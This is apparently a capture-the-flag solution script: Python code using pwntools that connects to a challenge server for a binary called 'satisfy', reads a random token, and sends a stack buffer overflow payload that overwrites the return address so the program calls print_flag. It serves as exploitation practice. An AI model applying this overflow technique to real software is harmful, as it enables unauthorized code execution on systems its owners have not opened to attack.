from pwn import *

# p = process('./satisfy')
p = remote('0.cloud.chals.io', 34720)
e = ELF('./satisfy')

ret = 0x401020
p.recvuntil(b'token ')
rand = int(p.recvline()[:-1])
log.info(str(rand))

payload = b'A' * 0x10
payload += p64(~0x3f&0xff)
payload += p64(0x7a69^rand)
payload += b'A' * 0x8
payload += p64(e.symbols['print_flag'])
print(hex(len(payload)))
p.sendline(payload)
p.interactive()
